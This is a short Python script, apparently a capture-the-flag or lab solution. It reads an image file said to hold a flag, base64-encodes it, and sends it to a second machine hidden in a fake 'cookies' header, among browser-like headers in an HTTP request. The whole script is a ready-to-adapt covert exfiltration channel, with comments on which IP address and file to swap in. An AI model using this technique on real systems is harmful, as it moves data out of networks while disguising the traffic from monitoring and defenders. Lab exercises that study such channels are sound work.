from scapy.all import IP, ICMP, send
import textwrap, base64, time, requests

# replace 'image.jpg' with the name of the image containing the flag. 
with open("image.jpg", "rb") as f:
	img = base64.b64encode(f.read()).decode()

headers = {
	"User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:135.0) Gecko/20100101 Firefox/135.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.:8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "Connection": "keep-alive",
    "Referer": "http://192.168.10.128:8080/", # Replace with IP address of Machine A
    "Upgrade-Insecure-Requests": "1",
    "Priority": "u=0, i",
    "cookies": img
}

# Replace '192.168.10.128' with IP address of machineA
# Update URL path to file name of the arbitrary image if the image has been changed
response = requests.get("http://192.168.10.128:8080/15-i-have-no-idea.jpg", headers=headers)